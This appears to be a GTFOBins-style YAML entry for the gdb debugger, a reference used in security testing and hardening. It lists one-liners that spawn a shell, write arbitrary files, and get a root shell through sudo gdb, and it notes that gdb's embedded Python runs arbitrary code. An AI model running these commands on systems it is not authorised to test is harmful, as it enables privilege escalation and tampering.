---
description: |
  GDB may come with embedded Python support, in that case arbitrary code can be
  executed with the `python` command in the context of the GDB process.

  See the entries of Python [version 2](/gtfobins/python2/) and
  [version 3](/gtfobins/python3/).
functions:
  execute-interactive:
    - code: gdb -nx -ex '!sh' -ex quit
  file-write:
    - code: |
        LFILE=file_to_write
        gdb -nx -ex "dump value $LFILE \"data\"" -ex quit
  sudo-enabled:
    - code: sudo gdb -nx -ex '!sh' -ex quit
---
